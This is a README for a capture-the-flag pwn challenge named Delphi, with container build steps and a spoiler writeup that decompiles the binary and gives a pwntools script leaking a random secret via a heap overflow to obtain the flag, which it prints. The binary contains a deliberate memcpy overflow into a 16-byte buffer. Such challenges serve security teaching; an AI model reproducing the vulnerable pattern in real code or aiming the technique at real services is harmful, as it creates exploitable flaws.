# Delphi

An <ins>extremely simple pwn</ins> challenge where a port and the a [zip file](out/challenge.zip) is given to the players.

## How to run

The image was tested with podman, but should work fine with docker as well.

0. Clone the repo and cd to the root folder of the particular challenge
1. Build the image: `podman build -t ctf-delphi:latest .`
2. Run the image: `podman rm -f ctf-delphi; podman run --rm -it -p 1337:1337 -e CHALLENGE_PORT=1337 --name ctf-delphi ctf-delphi:latest`
3. Share the [zip file](out/challenge.zip) and the port with the players

<details>
<summary>Writeup (Spoiler)</summary>

Let's run `checksec` on the binary first:

```
[steve@todo ctf-delphi]$ checksec --file=./out/delphi
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH     Symbols          FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols        No    0               4               ./out/delphi
```

There is not much room for exploitation since the binary is compiled with all the mitigations enabled. We get the libc and all other interesting stuff from the Dockerfile: `ghcr.io/void-linux/void-glibc:20231003R1`

Let's run the binary:

```
[steve@todo ctf-delphi]$ ./out/delphi 
Welcome to the Oracle of Delphi!
Hic es forsit ut tuum futurum invenias.

I will think of something bright and shiny. If you manage to think of the same thing, I will predict your future.
If not, shall the gods have mercy on your soul.

What shall I think of (ie What's my favorite instrument)? test
So you asked: test

Okay, now that's a good one. Let me think...
Got it. Any clue what it is I had in mind? no
Nope, that's not it. You're doomed.
```

We either go for random fuzzing here and play with the values to see if we can trigger a stack overflow or we just open the binary in Ghidra and see what's going on. Here is the pseudocode of the `main` function:

```c

undefined8 FUN_001013bf(void)

{
  int iVar1;
  time_t tVar2;
  long in_FS_OFFSET;
  int local_7c;
  char *local_78;
  size_t local_70;
  char *local_68;
  char *local_60;
  FILE *local_58;
  __ssize_t local_50;
  char local_48 [56];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  FUN_0010131c();
  FUN_00101289();
  local_68 = (char *)malloc(0x10);
  local_60 = (char *)malloc(0x20);
  memset(local_60,0,0x20);
  getrandom(local_60,0x20,0);
  for (local_7c = 0; local_7c < 0x20; local_7c = local_7c + 1) {
    if ((local_60[local_7c] == '\0') || (local_60[local_7c] == '\n')) {
      local_60[local_7c] = '*';
    }
  }
  puts("Welcome to the Oracle of Delphi!");
  puts("Hic es forsit ut tuum futurum invenias.\n");
  puts(
      "I will think of something bright and shiny. If you manage to think of the same thing, I will predict your future."
      );
  puts("If not, shall the gods have mercy on your soul.\n");
  printf("What shall I think of (ie What\'s my favorite instrument)? ");
  FUN_00101341(local_68);
  printf("So you asked: ");
  puts(local_68);
  puts("Okay, now that\'s a good one. Let me think...");
  sleep(2);
  printf("Got it. Any clue what it is I had in mind? ");
  fgets(local_48,0x21,stdin);
  iVar1 = strncmp(local_48,local_60,0x20);
  if (iVar1 == 0) {
    puts("Woah... You got it. Interested in a job offer? We have some good java coffee.");
    local_78 = (char *)0x0;
    local_70 = 0;
    tVar2 = time((time_t *)0x0);
    srand((uint)tVar2);
    local_58 = fopen("flag.txt","r");
    if (local_58 == (FILE *)0x0) {
      puts("Error: flag.txt not found. Contact an admin.");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    while (local_50 = getline(&local_78,&local_70,local_58), local_50 != -1) {
      printf("%s",local_78);
    }
    fclose(local_58);
    if (local_78 != (char *)0x0) {
      free(local_78);
    }
  }
  else {
    puts("Nope, that\'s not it. You\'re doomed.");
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

So far so good. There is no obvious vulnerability here, but we can see some mallocs and a call to `fgets`. Let's see what the `FUN_00101341` function does:

```c
void FUN_00101341(void *param_1)

{
  size_t __n;
  long in_FS_OFFSET;
  char local_518 [1288];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  fgets(local_518,0x500,stdin);
  __n = strlen(local_518);
  memcpy(param_1,local_518,__n);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Now that's what I call a classic example of a nasty buffer overflow! So it creates a temporary buffer, reads the user input into it and copies the result back to the input buffer. However the input buffer is only 16 bytes long, so we can easily overflow it. But due to the mitigations in place, we can't do much. Let's just see what the main function does.

So its essentially generating some random data, asks the user to input something and compares the input with the random data. If the input matches the random data, it prints the flag. So we need to leak the random data somehow. Let's see what happens if we give it a very long input and echo it back:

```py
exe = "./out/delphi"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "debug"

io = start()

io.sendlineafter(b"instrument)?", cyclic(31))
line = io.recvline()
log.info(f"Line: {line}")

thought = io.recvline()[0:32]
log.info(f"Thought: {thought}")

io.sendafter(b"mind? ", thought)

io.recvline_endswith(b"coffee.")
flag = io.recvline().decode().strip()
log.info(f"Flag: {flag}")
```

```
[DEBUG] Received 0x2b bytes:
    b'Got it. Any clue what it is I had in mind? '
[DEBUG] Sent 0x20 bytes:
    00000000  94 30 16 55  65 ae 96 d8  1e 9b 5e 59  71 02 6e 41  │·0·U│e···│··^Y│q·nA│
    00000010  1f 02 af a8  61 c1 0d 3f  02 ba 4d 62  d5 d8 df 46  │····│a··?│··Mb│···F│
    00000020
[DEBUG] Received 0x4e bytes:
    b'Woah... You got it. Interested in a job offer? We have some good java coffee.\n'
[DEBUG] Received 0x37 bytes:
    b'cq23{l3t_mE_t3ll_UR_FUtuRe:ur_g0nna_be_4_gr3at_h4ck3r}\n'
[*] Flag: cq23{l3t_mE_t3ll_UR_FUtuRe:ur_g0nna_be_4_gr3at_h4ck3r}
[*] Process './out/delphi' stopped with exit code 0 (pid 150741)
```

We get back the flag. This was way too easy!
</details>